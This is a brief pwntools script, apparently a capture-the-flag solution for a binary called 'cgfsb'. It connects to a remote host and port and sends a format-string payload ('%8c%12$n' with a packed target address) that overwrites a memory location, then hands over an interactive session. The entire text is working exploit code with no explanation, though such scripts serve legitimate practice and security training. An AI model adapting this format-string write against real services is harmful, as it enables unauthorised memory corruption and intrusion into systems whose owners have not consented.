from pwn import *
context.log_level = "debug"
# p = process("./cgfsb")
p = remote("111.198.29.45" , 30874)

p.sendlineafter("name:\n" , "fantasy")
payload = "%8c%12$n" + p32(0x804A068)
p.sendlineafter("please:\n" , payload)

p.interactive()